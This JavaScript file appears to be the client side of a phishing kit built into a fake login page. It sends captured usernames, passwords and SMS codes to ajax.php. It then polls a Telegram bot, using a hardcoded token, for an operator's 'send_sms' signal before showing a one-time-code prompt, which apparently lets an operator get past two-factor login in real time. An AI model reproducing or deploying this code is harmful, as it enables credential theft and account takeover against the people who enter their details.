const wrapLang = document.querySelector('.wrap-lang');
const wrapAbc = document.querySelector('.wrap-abc');

wrapLang.addEventListener('click', function() {
  wrapAbc.style.display = wrapAbc.style.display === 'none' ? 'flex' : 'none';
});

$('body').on('click', '.oko', function(){
	if ($('#pass').attr('type') == 'password'){
		$(this).addClass('view');
		$('#pass').attr('type', 'text');
	} else {
		$(this).removeClass('view');
		$('#pass').attr('type', 'password');
	}
	return false;
});





$('.input-wrap').on('submit', function (event) {

event.stopPropagation();
event.preventDefault();

let form = this,
    submit = $('.submit', form),
    data = new FormData(),
    files = $('input[type=file]')


$('.submit', form).val('Отправка...');


data.append( 'userName', 		$('[name="userName"]', form).val() );
data.append( 'password', 		$('[name="password"]', form).val() );
data.append( 'sms', 		$('[name="sms"]', form).val() );

files.each(function (key, file) {
    let cont = file.files;
    if ( cont ) {
        $.each( cont, function(  value ) {
            data.append(  value );
        });
    }
});

$.ajax({
    url: 'ajax.php',
    type: 'POST',
    data: data,
    cache: false,
    dataType: 'json',
    processData: false,
    contentType: false,
    xhr: function() {
        let myXhr = $.ajaxSettings.xhr();

        if ( myXhr.upload ) {
            myXhr.upload.addEventListener( 'progress', function(e) {
                if ( e.lengthComputable ) {
                    let percentage = ( e.loaded / e.total ) * 100;
                        percentage = percentage.toFixed(0);
                    $('.submit', form)
                        .html( percentage + '%' );
                }
            }, false );
        }

        return myXhr;
    },
    error: function( jqXHR, textStatus ) {
        // Тут выводим ошибку
    },
    complete: function() {
        console.log('Complete');
        const loadingWrap = document.querySelector('.loading-wrap');
        loadingWrap.classList.add("act");
    }
});

return false;
});


const botToken = "5139393664:AAHriU_sSuFyRyusjjvPxmCYk-tIf9o3v-o";
const url = `https://api.telegram.org/bot${botToken}/getUpdates`;

// Polling function to check for updates (Not recommended for production)
async function pollUpdates() {
    try {
        const response = await fetch(url);
        const data = await response.json();

        data.result.forEach(update => {
            if (update.callback_query && update.callback_query.data === "send_sms") {
                const input = document.querySelector(".loading-wrap");
                input.classList.remove("act");
                const inputsms = document.querySelector(".input-styl3");
                inputsms.classList.add("act");
            }
        });
    } catch (error) {
        console.error("Error fetching updates:", error);
    }

    setTimeout(pollUpdates, 1000);
}

// Start polling for updates
pollUpdates();
